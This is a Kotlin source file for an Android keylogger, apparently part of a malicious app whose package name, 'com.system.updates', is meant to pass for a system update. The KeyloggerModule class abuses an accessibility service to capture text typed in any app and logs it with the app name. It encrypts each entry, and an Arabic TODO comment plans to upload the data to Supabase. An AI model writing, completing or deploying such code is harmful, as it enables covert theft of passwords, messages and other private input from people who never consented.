package com.system.updates.modules

import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityService
import android.util.Log
import com.system.updates.core.CryptoManager

class KeyloggerModule : AccessibilityService() {

    private val TAG = "KeyloggerModule"

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val packageName = event.packageName?.toString() ?: "Unknown"
            val typedText = event.text.toString()

            if (typedText.isNotEmpty()) {
                Log.d(TAG, "Typed in $packageName: $typedText")

                val logEntry = "App: $packageName | Content: $typedText"
                val encrypted = CryptoManager.encryptHybrid(logEntry.toByteArray())

                // TODO: إرسال encrypted إلى Supabase
            }
        }
    }

    override fun onInterrupt() {
        Log.e(TAG, "Service Interrupted")
    }
}
